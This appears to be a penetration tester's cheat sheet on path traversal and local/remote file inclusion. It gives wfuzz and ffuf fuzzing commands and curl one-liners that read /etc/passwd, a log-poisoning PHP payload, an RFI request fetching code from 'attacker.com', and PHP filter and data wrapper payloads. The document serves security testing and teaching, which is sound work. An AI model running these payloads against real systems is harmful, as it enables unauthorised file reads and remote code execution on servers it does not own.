# Traversal/File Inclusion

## Things to remember
  *  Traversal allows for arbitrary file read
  *  File inclusion uses the backend language to execute arbitrary code
      *  Syntax for LFI/RFI will depend on the backend language
      *  As always, enumerate the web stack thoroughly
  *  Most examples of file inclusion are PHP applications
  *  PayloadsAllTheThings has a page covering various [bypass and RCE techniques](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md)

## Useful tools
  *  [`wfuzz`](https://www.kali.org/tools/wfuzz/) and and [`ffuf`](https://github.com/ffuf/ffuf) for manually fuzzing web app inputs for traversal/inclusion
  *  [`seclists`](https://github.com/danielmiessler/SecLists) for traversal/inclusion fuzzing lists
  *  [`curl`](https://curl.se/) for traversal/inclusion one-liners

## Fuzzing for traversal/file inclusion
  *  `wfuzz` for traversal/file inclusion fuzzing
      *  Fuzz more than just parameters! Cookies, headers, etc.
  *  Carefully parse HTTP POST requests before using `wfuzz`
      *  Be specific with things like cookies, headers, URL structure, etc.
      *  Failing to provide these values can produce ineffective requests
  *  `ffuf` can parse requests from text files
      *  Easier handling of more complex POST requests
      *  No recursive grep, consider `Burp Intruder` in these cases

```
wfuzz -w /path/to/traversal.txt -b 'exampleCookie=cookieValue' 'http://10.0.0.1/traversal?param=FUZZ'
wfuzz -w /path/to/inclusion.txt -H 'exampleHeader: headerValue' -d 'param=FUZZ' 'http://10.0.0.1/inclusion'
```

```
ffuf -request req.txt --request-proto http -w /path/to/inclusion.txt -v
```

## Exploiting path traversal
  *  Consider targeting world-readable files to confirm traversal
      *  `apparmor`, blacklists, etc. interfere with these tests
  *  Path traversal provides arbitrary file read
      *  Gather internal info such as OS/kernel version, network config, users, etc.
      *  Configuration and source code files can be juicy
  *  Files related to the vulnerable service are likely close to the current working directory
      *  Research sensitive file locations of known running services/software
      *  Increment upwards traversal until a hit or unreasonable length

```
/etc/passwd
C:\windows\system32\drivers\etc\hosts
C:/windows/system32/drivers/etc/hosts
```

```
curl -b 'exampleCookie=cookieValue' 'http://10.0.0.1/traversal?page=/etc/passwd'
curl -k -X 'POST' -H 'exampleHeader: headerValue' -d 'page=/etc/passwd' 'https://10.0.0.1/traversal'
```

## Exploiting file inclusion
  *  File inclusion provides arbitrary code execution AND file read
      *  Enumerate web stack and research backend language for syntax
  *  Any means of modifying filesystem contents could escalate to RCE
      *  Log files are easily modified by interacting with the web service
      *  Research OS/web server version for potential log file locations
      *  Double quotes (`"`) may be automatically escaped in log files causing syntax errors
  *  Remote file inclusion coerces the backend to fetch code from a remote source

```
curl -A '<?php phpinfo(); ?>' 'http://10.0.0.1'
curl -b 'exampleCookie=cookieValue' 'http://10.0.0.1/inclusion?page=/var/log/apache2/access.log'
curl -k -X 'POST' -H 'exampleHeader: headerValue' -d 'page=http://attacker.com/rfi.php' 'https://10.0.0.1/remoteinclusion'
```

## PHP specific techniques
  *  PHP version `5.3 and lower` [terminates strings at any null byte](https://www.php.net/manual/en/security.filesystem.nullbytes.php)
      *  `%00` can be used to truncate the end of any supplied string
  *  [PHP wrappers](https://www.php.net/manual/en/wrappers.php) can be leveraged to make file inclusion easier
      *  [`base64-encode`](https://www.php.net/manual/en/filters.convert.php) and [`data`](https://www.php.net/manual/en/wrappers.data.php) wrappers are particularly useful
      *  More wrappers covered in [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md) and [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

```
php://filter/convert.base64-encode/resource=example.php
data:text/plain,<?php phpinfo(); ?>
```
